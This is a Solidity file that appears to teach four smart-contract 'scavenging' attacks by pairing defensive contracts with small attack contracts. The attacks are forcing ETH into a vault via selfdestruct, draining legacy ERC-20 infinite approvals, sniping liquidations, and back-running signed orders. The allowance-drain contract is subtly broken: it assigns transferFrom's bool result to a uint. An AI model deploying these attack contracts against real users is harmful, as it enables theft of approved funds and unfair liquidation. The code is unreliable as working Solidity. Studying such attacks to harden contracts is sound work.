// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/*//////////////////////////////////////////////////////////////
                  SHARED LIBS ‑ ERRORS ‑ EVENTS
//////////////////////////////////////////////////////////////*/
error NotOwner();
error Invariant();
error AlreadyScavenged();
error AllowanceExpired();
error OrderExpired();
error BadSignature();
error NotLiquidatable();
error CoolDown();

library MathLib {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked { uint256 c = a + b; if (c < a) revert Invariant(); return c; }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked { if (b > a) revert Invariant(); return a - b; }
    }
}

/*//////////////////////////////////////////////////////////////
          1.  ETHER‑SCAVENGING  – Attack & Defense
//////////////////////////////////////////////////////////////*/
contract SafeVault {
    using MathLib for uint256;

    address public immutable owner;
    uint256 public totalDeposited;

    event Deposit(address indexed from, uint256 amt);
    event Withdraw(address indexed to, uint256 amt);

    constructor() { owner = msg.sender; }

    receive() external payable { revert("GhostETH not accepted"); }

    function deposit() external payable {
        totalDeposited = totalDeposited.add(msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amt) external {
        if (msg.sender != owner) revert NotOwner();
        totalDeposited = totalDeposited.sub(amt);
        (bool ok, ) = owner.call{value: amt}("");
        require(ok);
        emit Withdraw(owner, amt);
    }
}

/* --- Attack contract that “haunts” a naïve vault --- */
contract Attack_EtherScavenge {
    function haunt(address target) external payable {
        selfdestruct(payable(target)); // sends ETH bypassing deposit()
    }
}

/*//////////////////////////////////////////////////////////////
    2.  ALLOWANCE‑SCAVENGING  – Attack & Hardened ERC‑20
//////////////////////////////////////////////////////////////*/
interface IERC20 { /* minimal */ 
    function transferFrom(address, address, uint256) external returns (bool);
}

contract AllowanceGuard {
    using MathLib for uint256;

    struct Allow { uint128 amount; uint32  deadline; uint96 nonce; }
    mapping(address => mapping(address => Allow)) public allowances;

    event Approval(address indexed owner, address indexed spender, uint256 amt, uint256 deadline);

    function approve(address spender, uint128 amt, uint32 ttlSeconds) external {
        allowances[msg.sender][spender] = Allow(amt, uint32(block.timestamp) + ttlSeconds, allowances[msg.sender][spender].nonce + 1);
        emit Approval(msg.sender, spender, amt, block.timestamp + ttlSeconds);
    }

    function spend(address owner, uint256 amt) external {
        Allow storage alw = allowances[owner][msg.sender];
        if (block.timestamp > alw.deadline) revert AllowanceExpired();
        if (amt > alw.amount) revert Invariant();
        alw.amount = uint128(alw.amount.sub(amt));
        // custom business logic here – e.g., move internal balances
    }
}

/* --- Bot that vacuums infinite approvals on legacy ERC‑20 --- */
contract Attack_AllowanceScavenge {
    function suck(IERC20 token, address victim) external {
        uint bal = token.transferFrom(victim, msg.sender, type(uint256).max-1); // try max drain
        bal; // ignore compiler “unused” warning
    }
}

/*//////////////////////////////////////////////////////////////
     3.  LIQUIDATION‑SCAVENGING  – Demo Money‑Market Sniper
//////////////////////////////////////////////////////////////*/
interface IMoneyMarket {
    function healthy(address user) external view returns (bool);
    function liquidate(address user) external;
}

contract AutoKeeper {
    using MathLib for uint256;
    uint256 public bond;                 // keeper’s stake (anti‑snipe)
    uint256 public coolDown = 30;        // sec after which anyone may liquidate
    mapping(address => uint256) public lastCheck; // user => ts

    event Checked(address indexed user, uint256 when);
    event Liquidated(address indexed user);

    function check(address user) external payable {
        if (msg.value > 0) bond = bond.add(msg.value);
        lastCheck[user] = block.timestamp;
        emit Checked(user, block.timestamp);
    }

    function liquidate(IMoneyMarket mm, address user) external {
        if (block.timestamp < lastCheck[user] + coolDown) revert CoolDown();
        if (mm.healthy(user)) revert NotLiquidatable();
        mm.liquidate(user);
        emit Liquidated(user);
    }
}

/* --- Minimal attacker that races keeper’s tx in mempool --- */
contract Attack_LiquidationSnipe {
    function race(IMoneyMarket mm, address victim) external {
        if (!mm.healthy(victim)) {       // same check but MEV relayer gives priority
            mm.liquidate(victim);
        }
    }
}

/*//////////////////////////////////////////////////////////////
     4.  ORDER‑SCAVENGING  (RFQ / Limit‑Order)  – Safe Module
//////////////////////////////////////////////////////////////*/
library ECDSA {
    function recover(bytes32 h, bytes calldata sig) internal pure returns (address s) {
        bytes32 r; bytes32 s_; uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s_ := calldataload(add(sig.offset, 32))
            v := shr(248, calldataload(add(sig.offset, 64)))
        }
        s = ecrecover(h, v, r, s_);
    }
}

contract TimelockedRFQ {
    using ECDSA for bytes32;

    struct Order { address maker; address taker; uint128 sell; uint128 buy; uint32 start; uint32 end; uint96 salt; }

    bytes32 constant TYPEHASH = keccak256("Order(address maker,address taker,uint128 sell,uint128 buy,uint32 start,uint32 end,uint96 salt)");
    bytes32 immutable DOMAIN;

    mapping(bytes32 => bool) public filled;

    event Filled(bytes32 indexed id, address indexed taker);

    constructor() { DOMAIN = keccak256(abi.encode(keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)"),
                                                   keccak256("TimelockedRFQ"), block.chainid, address(this))); }

    function fill(Order calldata o, bytes calldata sig) external {
        if (block.timestamp < o.start || block.timestamp > o.end) revert OrderExpired();
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN, keccak256(abi.encode(TYPEHASH, o))));
        if (digest.recover(sig) != o.maker) revert BadSignature();
        if (filled[digest]) revert AlreadyScavenged();
        filled[digest] = true;
        // …swap tokens here…
        emit Filled(digest, msg.sender);
    }
}

/* --- Bot that back‑runs just before `end` timestamp --- */
contract Attack_OrderScavenge {
    function backRun(TimelockedRFQ rfq, TimelockedRFQ.Order calldata o, bytes calldata sig) external {
        rfq.fill(o, sig); // slip in within same block as original taker, higher gas price
    }
}
